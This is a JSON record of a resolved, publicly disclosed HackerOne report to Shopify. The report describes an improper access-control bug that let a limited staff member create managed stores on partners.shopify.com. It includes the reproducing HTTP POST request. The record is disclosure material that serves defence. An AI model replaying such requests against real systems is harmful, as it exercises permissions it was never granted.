@@ -1,0 +1,140 @@
+{
+  "id": 1167753,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTY3NzUz",
+  "url": "https://hackerone.com/reports/1167753",
+  "title": "Add new managed stores without permission",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2021-04-18T12:23:49.687Z",
+  "submitted_at": "2021-04-18T12:23:49.850Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "jmp_35p",
+    "url": "/jmp_35p",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/giyoz9ry9im7n91le455jxg5caqp/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 1382,
+    "url": "https://hackerone.com/shopify",
+    "handle": "shopify",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Shopify",
+      "twitter_handle": "",
+      "website": "https://www.shopify.com",
+      "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2021-07-08T18:25:09.605Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-06-14T11:11:26.327Z",
+  "team_member_agreed_on_going_public_at": "2021-07-08T18:25:09.464Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Details\nA staff member who has permission to add, archive and unarchive development stores as shown in managedStoreA.png  can also add new managed stores. I can't tell if the issue I pointed out in #1167453 has the same root cause as this. A staff member with the said permission can access /organizationID/stores/create_managed_store endpoint as seen in managedStoreB.png. The POST request below can be used to reproduce the described issue.\n\n```\nPOST /100808/stores/create_managed_store HTTP/1.1\nHost: partners.shopify.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:86.0) Gecko/20100101 Firefox/86.0\nAccept: application/json\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://partners.shopify.com/100808/stores/new?store_type=managed_store\nContent-Type: application/json\nX-Requested-With: XMLHttpRequest\nX-CSRF-Token: ...\n\n{\"message\":\"\",\"permissions\":[\"applications\",\"customers\",\"dashboard\",\"domains\",\"draft_orders\",\"edit_orders\",\"gift_cards\",\"links\",\"locations\",\"marketing\",\"marketing_section\",\"orders\",\"overviews\",\"pages\",\"products\",\"reports\",\"themes\",\"preferences\",\"view_shopify_payments_payouts\",\"view_billing_details\",\"view_private_apps\",\"edit_private_apps\"],\"store_domain\":\"myStore1\",\"collaborator_access_code\":\"\"}\n\n```\n\n## Impact\n\nStaff member can perform action that requires permission",
+  "weakness": {
+    "id": 26,
+    "name": "Improper Access Control - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1269783,
+      "file_name": "managedStoreA.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/3btetki1203jrpi03jyktrhbkkkv?response-content-disposition=attachment%3B%20filename%3D%22managedStoreA.png%22%3B%20filename%2A%3DUTF-8%27%27managedStoreA.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRJDBLZ2Z%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T022106Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEID%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDepFltkZ2hO8UHfd5mFXVz8l%2BTUVW113ml%2FuaPgvWZ8wIhAPeAMjU2miCfSNU2uHQ0MUfS6kQhoFRbbnn62nzuSJU6KrsFCPn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgysGhvuREYU4g4T2AIqjwXTZLn8mDO6kybMewfVNFLZkPLoNIOkAWx8dww21OL3i0WPszib46EK4DHeBVjp4attztMfmF8kY2KBBVN23sYOvsGon4YSV9VJ0Xf5ALrZRCxe5sVlBCT%2BFOJwY%2F65zpGrzW0IsJSBcy9SEMH4cbkTX9mLGlzPjaB0JDG0KSScFY2EfjzHDC7xZTfnN7blFqjl2qLddfyGK5wpHcMyRD8Bd395l8CydHMY6mFZaStTsmxHRM9Bco6hsa4ZJCbKXAuYfnp0VT3a5cDSFWgFSapHp7DtUn2MZkwMi2eZ0iQYMijs%2FeLPaM6Qyn0EJpdYAmZQQNPSpR7j9ePIVu1K5IL1MuhaD5zDhKQGxd4C1yYG2KQcABFtRbiUXzzj1QnmR%2FXr%2FOuyYHM7vwM61cbs%2B3iSBgywxwy7S7PKe6SeEGbfJh7i6AKBKxX2BLjswluP4YFGDjSmITgknay7nxFQYYWXba79pvRBxkPUtuECxUo74f%2BPqLocbDKWjSNqlMjFGoJYUlPFQLhk7jO3M1GrM2eGyh44%2Bdp9pEedLtnt5RkqgUkPue7oXsgqbqZthezQf218t%2Bdg40xaHxElSGWZ4f3kK5IxwCVwD8Zuctgw7uOGIBT8XBTpsr5tOBaua55ZATQufD66AYIk3AsMaiB82b%2FlTY%2FePmfERmhlH%2FTyVL6JWCdsVUzBeQdfj4SYYNYLEcYflE4ttGScjUOAHqSce%2B3v0cCUkehIKX4hCdTHR2cjj%2Fz3LOpJkoS4Gpn%2FNFy3nHwjofxt5o3qYKB8OxdLXAkp2IpjLewPMKQyuMTPb7EjlRvjJLnbrscvfa62MfUQxNKGiTVgMLOFc0pXi5LsVR%2Fcq8o63p78cksxM5C%2FKL7rMKqEvcYGOrABNPlCkSSfBkVvYKKO6j6J8cY9Io9Ba4qTLyrKiZ%2F6%2BmbDf9CY%2FABjICW8%2BvmGB1I4uBhy%2FPv50PTwa3x0Ni%2BjqIp%2FVPbrowkHolWordcCsE4mRkGVv26hYBaH2p4D2Lk0UTTYEsoXx0r2hrxTfJi0F3PySKUvFEJt8RMMvav%2BsE6ZsFzzgtzRnB%2FuoiQsmusH46nnoBNy5UEqvFuoYdKZk6LO3SFM6CVGx2alIwmpgwQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f08367dfec0753bdae17c0341a6cdb927024ddb127955160fb98e2527c0f9124",
+      "file_size": 137416,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 32,
+  "voters": [
+    "osman1337",
+    "sw33tlie",
+    "tolga",
+    "drsniper",
+    "alp",
+    "mattberg",
+    "shreyaschavhan",
+    "ali",
+    "tess",
+    "goedix",
+    "and 22 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 4.3,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "none",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 422,
+    "asset_type": "URL",
+    "asset_identifier": "partners.shopify.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
